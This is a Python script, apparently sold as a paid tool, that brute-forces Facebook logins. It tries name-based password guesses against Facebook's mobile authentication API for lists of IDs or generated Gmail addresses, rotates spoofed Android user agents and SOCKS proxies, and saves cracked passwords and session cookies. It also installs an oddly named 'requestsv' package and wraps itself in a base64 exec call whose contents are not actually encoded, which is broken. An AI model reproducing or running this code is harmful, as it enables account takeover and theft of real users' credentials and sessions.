# Compiled By Mr Mafia | Muhammad Muzammil
# Github  :  https://github.com/Muzammil-404

import base64
exec(base64.b64decode("import os,json,hashlib,io,struct
os.system('clear')
os.system('xdg-open https://chat.whatsapp.com/GjKY8C8AMhNJLwhKzCBQtr')





import os,sys,random,requests,string
from time import time as timex
import requests,os,re,bs4,sys,uuid,json
import time,random,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup
remover = '\x1b[1;0m'
green = '\x1b[1;92m'
red = "\033[1;91m"
orange = '\x1b[38;5;208m'
yal = "\033[1;93m"
whi = "\033[1;97m"
W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
lin = "------------------------------------"
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
try:
	open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)
except requests.exceptions.ConnectionError:
	exit(' Network Is Very Slow ')
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'socks5://'+random.choice(proxies)}

import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)


from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'ar_AR'
try:
	fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
	fbcr = 'Roshan'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
	fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
	total = 0
	for i in fbcr:
		total+=1
	select = ('1','2')
	if select == '1':
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
		sim_id+=fbcr
	elif select == '2':
		try:
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
		except Exception as e:
			fbcr = "Roshan"
			sim_id+=fbcr
	else:
		fbcr = 'Roahan'
		sim_id+=fbcr
except:
	fbcr = "Roahan"
device = {'android_version':android_version,
'model':model,
'build':build,
'fblc':fblc,
'fbmf':fbmf,
'fbbd':fbbd,
'fbdv':model,
'fbsv':fbsv,
'fbca':fbca,
'fbdm':fbdm}
#-&-----user agent ))))
def ua1():

    alex1 = str(random.randint(100,400))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))

    alex9 = str(random.randint(200,400))+".0.0."+str(random.randint(7,37))+"."+str(random.randint(101,151))

    alex2 = random.randint(410000000,499999999)

    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])

    
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/EC6109V1;FBSV/5.1.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua       

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
sys.stdout.write('\x1b]2; RZR\x07')
####@-----Folder-----@####
try:os.mkdir('/sdcard/RZR')
except:pass
try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(47*'\033[1;97m-')

def p(x):
	print(x)



id = []
ok = []
cp = []
oks = []
cps = []
loop = 0
method=[]
TRTBRAND = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
ses = requests.Session()

    
def logo():
	os.system('clear')
	logo = (f"""   
\033[1;32m88""Yb 8888P 88""Yb   \033[1;91m | \033[1;37mowner   : Rafi Ullah
\033[1;32m88__dP   dP  88__dP   \033[1;91m | \033[1;37mTool    : File  gmail
\033[1;91m88"Yb   dP   88"Yb    \033[1;91m | \033[1;37mStatus  : Paid
\033[1;91m88  Yb d8888 88  Yb    \033[1;91m| \033[1;37mVersion : 0.1
\033[1;32m------------------------------------------------""")                              

	print(logo)
def clear():
	os.system("clear")
def linex():
    print('\33[1;97m--------------------------------------------------')
#





nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		print(f'{W}[1] File cloning\n[2] Random Gmail Cloning\n[0] Exit Menu')
		line()
		opt1 = input('[?] Choose an option: ')
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":gmail()
		elif opt1 == "3":exit()
		
		elif opt1 == "0":exit("")
		else:p("[•] Wrong Select ");sp(2);self.iAmMenu()
	
	
	
	def file_menu(self):
		logo()
		file = input('[?] Put file path\033[1;37m: ')
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p("[•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		#
		for i in range(1 , 4):
			
			
			print(f'[{i}] Method ')
		
		line()
		m_opt = input('[?] Choose: ')
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		elif m_opt =="4":
			method.append('iiii')
			self.password_menu(id)
		else:p("[•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20	
		try:
			plimit = int(input('[?] Put Password Limit : '))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p("\033[1;97m[\033[1;96m•\033[1;97m] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		for n in range(plimit):
			pwx.append(input("[?] Put password %s : "%(n+1)))
		logo()
		p("[♦] Total Ids  : \033[1;32m%s "%(str(len(id))))
		print(f'{R}[♦] Please Wait Brute Has Been Started ')
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					saqi.submit(self.method4,uid,nm,pwx)
	def saved_results(self,ok,cp):
		p("\033[1;97m")
		line()
		p(" [♦] Total OK : %s "%(len(ok)))
		line()
		input("[♦] Press Enter To Go Back ")
		self.iAmMenu()

	

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[RZR-M1] %s | {green}OK:%s {red}CP:%s "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
				    'adid': str(uuid.uuid4()),
				    'format': 'json',
				    'device_id': str(uuid.uuid4()),
				    'cpl': 'true',
				    'family_device_id': str(uuid.uuid4()),
				    'credentials_type': 'device_based_login_password',
				    'error_detail_type': 'button_with_disabled',
				    'source': 'device_based_login',
				    'email': uid,
				    'password': pw,
				    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				    'generate_session_cookies': '1',
				    'meta_inf_fbmeta': '',
				    'advertiser_id': str(uuid.uuid4()),
				    'currently_logged_in_userid': '0',
				    'locale': "en_US",
				    'client_country_code': "US",
				    'method': 'auth.login',
				    'fb_api_req_friendly_name': 'authenticate',
				    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
				    'api_key': '882a8490361da98702bf97a021ddc14d'
				}
				headers = {
				    'User-Agent': ua1(),
				    'Content-Type': 'application/x-www-form-urlencoded',
				    'Host': 'graph.facebook.com',
				    'X-FB-Net-HNI': '25227',
				    'X-FB-SIM-HNI': '29752',
				    'X-FB-Connection-Type': 'MOBILE.LTE',
				    'X-Tigon-Is-Retry': 'False',
				    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
				    'x-fb-device-group': '5120',
				    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
				    'X-FB-Request-Analytics-Tags': 'graphservice',
				    'X-FB-HTTP-Engine': 'Liger',
				    'X-FB-Client-IP': 'True',
				    'X-FB-Server-Cluster': 'True',
				    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
				    'Content-Length': '706'
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"                                	
					p('\r\033[1;92m[RZR-OK] %s | %s \033[1;97m '%(uid,pw))
					#p('\033[1;37m[🍪] Cookies :- '+coki)
					ok.append(uid)
					open('/sdcard/RZR-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RZR-COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					livechk("[•]"+uid+"|"+pw+"|"+coki) 
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[RZR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					livechk("[CP]"+uid+"|"+pw)
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[RZR-M2] %s | {green}OK:%s {red}CP:%s "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
				    "adid": str(uuid.uuid4()),
				    "format": "json",
				    "device_id": str(uuid.uuid4()),
				    "cpl": "true",
				    "family_device_id": str(uuid.uuid4()),
				    "credentials_type": "device_based_login_password",
				    "error_detail_type": "button_with_disabled",
				    "source": "register_api",
				    "email": uid,  # Replace with actual email
				    "password": pw,  # Replace with actual password
				    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				    "generate_session_cookies": "1",
				    "meta_inf_fbmeta": "NO_FILE",
				    "advertiser_id": str(uuid.uuid4()),
				    "currently_logged_in_userid": "0",
				    "locale": "en_NG",  # Locale for Nigeria
				    "client_country_code": "NG",  # Client country code for Nigeria
				    "method": "auth.login",
				    "fb_api_req_friendly_name": "authenticate",
				    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
				    "api_key": "882a8490361da98702bf97a021ddc14d"
				}
				headers = {
				    "User-Agent": ua1(),
				    "Content-Type": "application/x-www-form-urlencoded",
				    "Host": "graph.facebook.com",
				    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
				    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
				    "X-FB-Connection-Type": "MOBILE.LTE",
				    "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
				    "X-FB-Connection-Quality": "MOBILE.LTE",
				    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
				    "X-Tigon-Is-Retry": "False",
				    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
				    "x-fb-device-group": "5120",
				    "X-FB-Friendly-Name": "ViewerReactionsMutation",
				    "X-FB-Request-Analytics-Tags": "graphservice",
				    "X-FB-HTTP-Engine": "Liger",
				    "X-FB-Client-IP": "True",
				    "X-FB-Server-Cluster": "True",
				    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"         
					p('\r\033[1;92m[RZR-OK] %s | %s \033[1;97m '%(uid,pw))
					p('\033[1;33m[🍪] Cookies :- '+coki)
					ok.append(uid)
					open('/sdcard/RZR-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RZR-COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					livechk("[•]"+uid+"|"+pw+"|"+coki) 
					break
				elif 'www.facebook.com' in q['error']['message']:
				#	p('\r\033[1;91m[RZR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					livechk("[CP]"+uid+"|"+pw)
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
			
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[RZR-M3] %s | {green}OK:%s {red}CP:%s "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
				    "adid": str(uuid.uuid4()),
				    "format": "json",
				    "device_id": str(uuid.uuid4()),
				    "cpl": "true",
				    "family_device_id": str(uuid.uuid4()),
				    "credentials_type": "device_based_login_password",
				    "error_detail_type": "button_with_disabled",
				    "source": "register_api",
				    "email": uid,  # Replace with actual email
				    "password": pw,  # Replace with actual password
				    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				    "generate_session_cookies": "1",
				    "meta_inf_fbmeta": "NO_FILE",
				    "advertiser_id": str(uuid.uuid4()),
				    "currently_logged_in_userid": "0",
				    "locale": "en_PK",
				    "client_country_code": "PK",
				    "method": "auth.login",
				    "fb_api_req_friendly_name": "authenticate",
				    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
				    "api_key": "882a8490361da98702bf97a021ddc14d"
				}
				headers = {
				    "User-Agent": ua1(),
				    "Content-Type": "application/x-www-form-urlencoded",
				    "Host": "graph.facebook.com",
				    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
				    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
				    "X-FB-Connection-Type": "MOBILE.LTE",
				    "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
				    "X-FB-Connection-Quality": "MOBILE.LTE",
				    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
				    "X-Tigon-Is-Retry": "False",
				    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
				    "x-fb-device-group": "5120",
				    "X-FB-Friendly-Name": "ViewerReactionsMutation",
				    "X-FB-Request-Analytics-Tags": "graphservice",
				    "X-FB-HTTP-Engine": "Liger",
				    "X-FB-Client-IP": "True",
				    "X-FB-Server-Cluster": "True",
				    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"         
					p('\r\033[1;92m[RZR-OK] %s | %s \033[1;97m '%(uid,pw))
					p('\033[1;33m[🍪] Cookies :- '+coki)
					ok.append(uid)
					open('/sdcard/RZR-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RZR-COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					livechk("[•]"+uid+"|"+pw+"|"+coki) 
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[RZR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					livechk("[CP]"+uid+"|"+pw)
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)

#M4


#

def gmail():
                os.system('rm -rf .re.txt')
                logo()
                print('\033[1;37m example: malang, hamza, Aqib, waqas\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tpe(max_workers=30) as saqi:
                        total = str(len(fo))
                        logo()
                        print('Total account : \033[1;32m'+total)
                        print('The process is running in the background ')
                        print('Gmail Cracking started  ')
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                saqi.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ERROR.py')  
def rndm(ids,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
    try:
        for pas in passlist:    
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': ua1(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'MOBILE.LTE',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Sisirb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Sisirb};{ckkk}"
                print('\r\r\033[1;32m [RZR-OK] '+uid+' | '+pas+'\033[1;97m')
                print(f'\r\r\033[1;31m[\033[1;32mCOOKIE\033[1;31m]{B} {cookie}')
                open('/sdcard/RANDOM-ok.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                livechk("[•]"+uid+"|"+pas+"|"+cookie) 
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{A}[RZR-CP] {uid} | {pas} ")
                open('/sdcard/RANDOM-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
    except Exception as e:
            pass                     

    
iAmMain().iAmMenu()()
"))